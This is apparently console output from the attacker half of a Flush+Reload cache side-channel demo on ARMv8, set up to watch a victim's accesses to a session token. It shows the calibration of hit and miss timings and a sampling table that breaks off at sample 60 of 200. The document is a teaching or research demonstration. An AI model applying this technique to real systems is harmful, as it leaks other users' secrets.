╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffffb23d4000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    132 ns  (line already in cache)
[attacker]   DRAM miss     =   1955 ns  (line not in cache)
[attacker]   Threshold     =   1043 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2395        miss      0 hits so far  (warmup)
  2       2343        miss      0 hits so far  (warmup)
  3       1979        miss      0 hits so far  (warmup)
  4       1250        miss      0 hits so far  (warmup)
  5       3072        miss      0 hits so far  (warmup)
  6       1875        miss      0 hits so far  (warmup)
  7       1406        miss      0 hits so far  (warmup)
  8       1927        miss      0 hits so far  (warmup)
  9       1093        miss      0 hits so far  (warmup)
  10      1614        miss      0 hits so far  (warmup)
  11      1458        miss      0 hits so far
  12      1145        miss      0 hits so far
  13      2968        miss      0 hits so far
  14      1197        miss      0 hits so far
  15      1302        miss      0 hits so far
  16      1041        HIT ◄   1 hits so far
  17      1927        miss      1 hits so far
  18      1197        miss      1 hits so far
  19      1927        miss      1 hits so far
  20      1510        miss      1 hits so far
  21      3177        miss      1 hits so far
  22      2031        miss      1 hits so far
  23      3489        miss      1 hits so far
  24      1666        miss      1 hits so far
  25      1822        miss      1 hits so far
  26      1145        miss      1 hits so far
  27      1354        miss      1 hits so far
  28      1250        miss      1 hits so far
  29      2604        miss      1 hits so far
  30      1406        miss      1 hits so far
  31      1666        miss      1 hits so far
  32      2500        miss      1 hits so far
  33      1666        miss      1 hits so far
  34      1979        miss      1 hits so far
  35      1875        miss      1 hits so far
  36      1458        miss      1 hits so far
  37      2500        miss      1 hits so far
  38      2604        miss      1 hits so far
  39      2447        miss      1 hits so far
  40      1614        miss      1 hits so far
  41      1614        miss      1 hits so far
  42      3072        miss      1 hits so far
  43      1822        miss      1 hits so far
  44      1406        miss      1 hits so far
  45      2447        miss      1 hits so far
  46      1770        miss      1 hits so far
  47      2500        miss      1 hits so far
  48      1822        miss      1 hits so far
  49      1770        miss      1 hits so far
  50      1614        miss      1 hits so far
  51      1718        miss      1 hits so far
  52      1406        miss      1 hits so far
  53      2656        miss      1 hits so far
  54      1718        miss      1 hits so far
  55      2343        miss      1 hits so far
  56      2083        miss      1 hits so far
  57      1614        miss      1 hits so far
  58      1979        miss      1 hits so far
  59      2187        miss      1 hits so far
  60      1093        miss      1 hits so far
